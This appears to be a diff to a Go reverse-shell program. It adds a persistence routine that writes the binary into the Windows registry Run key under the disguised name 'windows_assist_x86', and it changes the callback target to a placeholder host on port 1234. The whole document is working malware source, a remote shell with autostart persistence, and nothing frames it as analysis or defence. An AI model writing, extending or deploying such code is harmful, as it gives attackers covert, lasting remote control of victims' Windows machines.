@@ -4,9 +4,13 @@ import (
 	"bufio"
 	"fmt"
 	"net"
+	"os"
 	"os/exec"
+	"path/filepath"
 	"syscall"
 	"time"
+
+	"golang.org/x/sys/windows/registry"
 )
 
 func reverse(host string) {
@@ -35,6 +39,27 @@ func reverse(host string) {
 	}
 }
 
+func perm() {
+	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))
+	if err != nil {
+		perm()
+	}
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
+	if err != nil {
+		perm()
+	}
+
+	if err = key.SetStringValue("windows_assist_x86", filepath.Join(dir, os.Args[0])); err != nil {
+		perm()
+	}
+
+	if err = key.Close(); err != nil {
+		perm()
+	}
+}
+
 func main() {
-	reverse("192.168.0.243:1234")
+	perm()
+	reverse("here.comes.your.ip:1234")
 }
